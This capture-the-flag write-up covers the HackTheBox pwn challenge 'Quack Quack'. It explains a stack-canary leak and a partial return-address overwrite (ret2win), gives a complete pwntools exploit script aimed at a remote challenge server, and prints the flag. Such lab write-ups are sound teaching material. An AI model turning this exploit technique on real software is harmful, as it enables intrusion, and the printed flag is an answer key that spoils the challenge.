---
title: "Quack Quack"
ctf: "HackTheBox"
date: 2026-06-02
category: pwn
difficulty: easy
points: 0
flag_format: "HTB{...}"
author: "gluppler"
---

# Quack Quack

## Summary

Dynamically linked x86-64 binary with a two-stage exploit in `duckling()`: first stage leaks the stack canary via an `strstr`/`printf` info leak, second stage overflows a buffer and partially overwrites the return address to call `duck_attack()` (ret2win).

## Solution

### Stage 1: Leak canary

`read(0, buf1, 0x66)` reads input, then `strstr(buf1, "Quack Quack ")` finds a substring, and `printf(&str_res[0x20])` leaks stack data from offset 0x20 past the match. By placing "Quack Quack " at offset 0x59 in the input, `&str_res[0x20]` points to `canary + 1` (skipping the null byte).

### Stage 2: Overflow + ret2win

`read(0, buf2, 0x6a)` allows 106 bytes into a smaller buffer. Canary is at offset 0x58, saved RBP at 0x60, return address at 0x68. With `0x6a` total bytes: `0x58` padding + 8 canary + 8 rbp + 2 bytes return address = exact fit. Overwrite the lower 2 bytes of the return address with `0x137f` to redirect to `duck_attack()` which prints the flag.

```python
import os
from pwn import *

context.arch = 'amd64'
duck_attack = 0x40137f

CHALLENGE_DIR = os.path.dirname(os.path.abspath(__file__)) + '/challenge'

p = remote('154.57.164.66', 31793)

p.recvuntil(b'> ')
p.sendline(b'A' * (0x65 - len(b'Quack Quack ')) + b'Quack Quack ')
p.recvuntil(b'Quack Quack ')
canary = u64(b'\x00' + p.recv(7))

payload = b'B' * 0x58
payload += p64(canary)
payload += p64(0)
payload += p16(duck_attack & 0xffff)

p.send(payload)
print(p.recvall(timeout=5).decode(errors='replace'))
```

## Flag

```
HTB{~c4n4ry_g035_qu4ck_qu4ck~}
```
